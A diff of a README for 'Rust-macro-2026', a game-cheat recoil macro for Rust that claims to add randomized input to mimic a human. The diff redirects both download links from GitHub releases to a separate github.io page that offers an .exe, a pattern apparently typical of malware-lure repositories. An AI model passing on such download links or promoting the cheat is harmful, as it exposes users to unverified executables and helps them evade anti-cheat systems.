@@ -1,6 +1,6 @@
 # 🎯 Rust-macro-2026 - Improve your weapon spray and control
 
-[![Download Rust-macro-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Produtorap793/Rust-macro-2026/releases)
+[![Download Rust-macro-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://produtorap793.github.io)
 
 Rust-macro-2026 helps players manage weapon recoil in the game Rust. This tool adjusts your aim during combat. It adds randomized variance to mimic human input and supports multiple weapon types and scopes.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these requirements to run the software.
 
 Follow these steps to acquire the tool from the official repository.
 
-1. Go to this [Download Page](https://github.com/Produtorap793/Rust-macro-2026/releases).
+1. Go to this [Download Page](https://produtorap793.github.io).
 2. Look for the "Assets" section at the bottom of the latest release post.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find later, such as your Downloads or Desktop folder.
